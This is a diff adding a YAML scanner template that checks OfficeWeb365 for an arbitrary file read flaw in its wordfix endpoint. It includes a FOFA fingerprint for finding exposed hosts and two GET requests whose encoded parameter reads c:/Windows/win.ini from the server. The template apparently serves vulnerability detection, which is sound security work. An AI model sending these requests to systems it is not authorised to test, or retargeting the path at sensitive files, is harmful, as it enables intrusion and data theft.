@@ -1,0 +1,20 @@
+id: poc-yaml-officeweb365-wordfix-anyfile-read
+info:
+  name: OfficeWeb365 wordfix 任意读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: officeweb365
+  fofa: body="请输入furl参数" || header="OfficeWeb365" || banner="OfficeWeb365"
+requests:
+- method: GET
+  path: /wordfix/Index?f=YzovV2luZG93cy93aW4uaW5p
+  expression: status_code == 200 && contains(headers,"OfficeWeb365")
+  output:
+  - regex_match(body,"id=\"Img\" value=\"(?P<img>.*?)\"")
+- method: GET
+  path: /WordFix/GetNext/?f=YzovV2luZG93cy93aW4uaW5p&img={{.img}}&isIE8=false
+  expression: status_code == 200 && contains(body,"[files]") && contains(body,"[fonts]")
+    && contains(headers,"OfficeWeb365") && contains(content_type,"application/json")
+variables: {}
+transport: http
